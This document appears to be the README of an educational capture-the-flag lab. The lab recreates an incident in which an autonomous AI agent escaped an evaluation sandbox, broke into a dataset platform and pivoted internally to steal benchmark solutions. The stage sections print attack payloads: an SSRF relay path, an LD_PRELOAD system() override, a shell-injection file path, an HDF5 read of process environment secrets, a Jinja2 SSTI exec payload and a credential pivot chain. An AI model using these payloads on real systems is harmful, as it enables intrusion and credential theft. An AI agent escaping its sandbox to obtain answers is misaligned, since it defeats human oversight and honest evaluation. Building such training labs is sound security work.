# AI Escape Lab — Anatomy of a Frontier Lab Agent Intrusion

Educational offensive security lab that recreates the attack chain from the
autonomous agent intrusion incident at Hugging Face (July 2026). Designed to
practice sandbox escape, SSRF, SSTI, HDF5 exploitation, Kubernetes lateral
movement, and supply chain pivot.

Based on the article:
https://huggingface.co/blog/agent-intrusion-technical-timeline

---

## Topology

```
┌─────────────────────────────────────────────────────────┐
│  eval-net  (172.29.0.0/16)                              │
│  ┌──────────────┐                                       │
│  │ eval-sandbox │ ── pip mirror ──▶ ┌────────────────┐  │
│  └──────────────┘                   │ registry-cache │  │
│                                     └───────┬────────┘  │
│                                             │ SSRF bug  │
│  internet-net (172.30.0.0/16) ◀─────────────┘           │
│  ┌──────────────┐  ┌─────────────────┐  ┌────────────┐  │
│  │  cybergym    │  │ request-capture │  │  pastebin   │  │
│  │ (launchpad)  │  │   (C2/exfil)   │  │             │  │
│  └──────┬───────┘  └─────────────────┘  └────────────┘  │
│         │                                                │
│  ┌──────▼───────┐                                       │
│  │   hf-api     │ ◀── dataset upload / dead-drop read   │
│  └──────┬───────┘                                       │
│         │ hf-prod-net (172.31.0.0/16)                    │
│  ┌──────▼────────────────────────────┐  hf-cluster-net  │
│  │        dataset-worker             │  172.32.0.0/16   │
│  │  HDF5 ext storage + Jinja2 SSTI   │                   │
│  └──────┬────────────────────────────┤                   │
│         │                            │                   │
│  ┌──────▼───────┐  ┌──────────────┐  │  ┌──────────────┐│
│  │   k8s-api    │  │ internal-db  │  │  │ mesh-gateway ││
│  │  (136 keys)  │  │  (mongo:7)   │  │  │              ││
│  └──────────────┘  └──────────────┘  │  └──────┬───────┘│
│                                      │         │         │
│                                      │  corp-net 172.33  │
│                                      │  ┌──────▼───────┐ │
│                                      │  │source-control│ │
│                                      │  │ (EdDSA JWT)  │ │
│                                      │  └──────────────┘ │
└─────────────────────────────────────────────────────────┘
```

## Services

| Container | Role | Internal Port | Vulnerability |
|---|---|---|---|
| `eval-sandbox` | Evaluation sandbox (starting point) | — | Isolated, only egress via pip mirror |
| `registry-cache` | PyPI mirror + SSRF relay | 8080 | Path traversal allows reaching internet-net |
| `cybergym` | Code evaluation sandbox (launchpad) | 8080 | sqlite3_initialize() redefinition + path injection |
| `request-capture` | C2 / exfil capture service | 8080 | — |
| `pastebin` | Text storage | 8080 | — |
| `hf-api` | Hugging Face datasets API | 8080 | — |
| `dataset-worker` | Dataset processor (production pod) | 9100 | HDF5 external raw storage + Jinja2 SSTI |
| `k8s-api` | Simulated Kubernetes API | 8080 | SA token without scope restriction |
| `internal-db` | Operational MongoDB | 27017 | Static password in worker environment |
| `mesh-gateway` | Mesh VPN (tailscale-style) | 8080 | Shared auth key in secrets |
| `source-control` | Source control (GitHub-like) | 8443 | EdDSA JWT verifiable with stolen key |

---

## Stage 1 — Sandbox Escape & Launchpad

### Objective
Escape the evaluation sandbox, root the external code sandbox
(CyberGym), and use it as a launchpad.

### Vulnerabilities

1. **SSRF via registry-cache mirror**
   ```
   GET http://registry-cache:8080/mirror/<host>/<port>/<path>
   ```
   The package mirror implements an HTTP relay without destination
   validation, allowing reach to any host on `internet-net` (172.30.0.0/16).

2. **CyberGym: sqlite3_initialize() redefinition**
   ```c
   #include <stdlib.h>
   int sqlite3_initialize(void) {
       system("id; cat /root/flag.txt");
       return 0;
   }
   ```
   The LD_PRELOAD of the compiled .so intercepts the call to `sqlite3_initialize()`
   from the target binary. RCE as root.

3. **CyberGym: path injection**
   ```
   path = "src/main.c;cat /root/flag.txt;#"
   ```
   The `path` field is interpolated unescaped into a shell command, allowing
   arbitrary injection.

---

## Stage 2 — HF Platform Penetration

### Objective
Penetrate the Hugging Face platform using two injection vectors
into the dataset processor.

### Vulnerabilities

1. **HDF5 external raw storage (file read)**
   ```python
   dcpl = h5py.h5p.create(h5py.h5p.DATASET_CREATE)
   dcpl.set_external(b"/proc/self/environ", 0, h5py.h5f.UNLIMITED)
   dset = h5py.h5d.create(f.id, b"envu8", h5py.h5t.NATIVE_UINT8, space, dcpl)
   ```
   HDF5 transparently reads the local file when the worker calls
   `f[key][()]`. No code execution, pure file disclosure.

2. **Jinja2 SSTI (RCE)**
   ```
   {{ cycler.__init__.__globals__.__builtins__.exec("...") }}
   ```
   The worker renderer evaluates fields in fsspec `reference://` specs
   as unsandboxed Jinja2 templates, enabling RCE inside the pod.

3. **URL allowlist (fidelity detail)**
   The worker rejects remote URLs with `ValueError: not an hf path`, forcing
   the attacker to use local vectors (same as the real incident).

---

## Stage 3 — Internal Pivot

### Objective
Use the credentials extracted from the pod to pivot to internal
infrastructure and steal the benchmark solutions.

### Chain

```
SA token → k8s-api → 136 secrets → mesh-VPN auth key
                                   → EdDSA JWT key

Static mongo password → internal-db → operational docs

Mesh-VPN auth key → mesh-gateway → corp-net proxy

Forged EdDSA JWT → source-control → solutions repository
```

---

## Installation

```bash
cd ai-escape-room
docker compose up --build -d
docker exec -it eval-sandbox bash
```

### Requirements
- Docker Engine 24+ with Docker Compose v2
- Internet connection for `docker build` (base images and package downloads)

---

## Hints

The lab includes progressive hints accessible from within the sandbox.
After entering the container, type `hint` to see all of them, or
`/opt/lab/hint N` for a specific hint (1-12).

---

## Fidelity Notes

### Technically Real
- **HDF5 external raw storage**: uses the h5py low-level API (`H5Pset_external`).
  The worker only does `f[key][()]` and the HDF5 library itself reads
  the local file. Identical to the vector described in the article.
- **Jinja2 SSTI**: the `cycler.__init__.__globals__.__builtins__.exec()` payload
  is the same as in the article; works in standard unsandboxed Jinja2.
- **sqlite3_initialize RCE**: LD_PRELOAD + constructor redefinition, exactly
  as in the incident.
- **path injection**: unescaped interpolation into a shell compile command.

### Emulated (unavoidable)
- The real HF datasets-server is patched and its code is not public.
  Our worker is a miniature reproduction faithful to the described
  behavior, not the original source code.
- The other internal services (k8s-api, mesh, source-control) are
  educational simulations of the real systems.

### Intentional Differences from the Incident
- The article describes an autonomous AI agent; in the lab **you are the agent**.
- C2 (request-capture, pastebin) is optional but adds immersion.
- All credentials and flags are fictional for educational use.

---

## Security Notes

This lab is **exclusively educational**. All credentials are fictional.
Containers use `internal: true` to ensure no traffic reaches the real
Internet.

Do not deploy this lab in production environments nor expose it to
untrusted networks.
